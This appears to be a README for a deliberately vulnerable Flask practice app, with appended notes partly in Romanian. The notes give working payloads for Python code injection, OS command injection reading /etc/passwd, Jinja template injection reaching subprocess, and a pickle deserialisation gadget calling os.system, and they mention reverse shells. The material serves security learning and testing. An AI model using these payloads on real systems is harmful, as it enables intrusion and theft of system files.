# Breakable Flask


A simple vulnerable Flask application.

This can be used to test out and learn exploitation of common web application vulnerabilities. 

Originally written because I wanted a very simple, single page vulnerable app that I could quickly run up to perform exploitation checks against. 

A the moment, the following vulnerabilities are present:
* Python code injection
* Operating System command injection
* Python deserialisation of arbitrary data (pickle)
* XXE injection
* Padding oracle


New vulnerabilities may be added from time to time as I have need of them.

1.Python code injection
__import__('subprocess').Popen('uname -a',shell=True,stdout=__import__('subprocess').PIPE).stdout.read().decode('utf-8')

2.Command execution
test || cat /etc/passwd (ex)

3.Template injection
https://hackerone.com/reports/125980 - copiat dupa asta mai exact scrii {{command}} ca sa se execute, unde {{}} e templateul. Identifici cu comanda de mai jos ce biblioteci sunt folosite in cod si apoi folosesti urmatorul payload:
     {{ [].__class__.__base__.__subclasses__() }}

{{''.__class__.mro()[2].__subclasses__()[247]('uname -a',shell=True,stdout=-1).communicate()[0]}} - 247 este pozitia pe care avem biblioteca subprocess.

4.Deserialization
class Blah(object):
    def __reduce__(self):
        return (os.system,("uname -a",))
h=Blah()
base64.b64encode(cPickle.dumps(h))
----- os.system va returna 0 ceea ce inseamna ca se executa ( de fel folosesti un reverse shell pt asta)

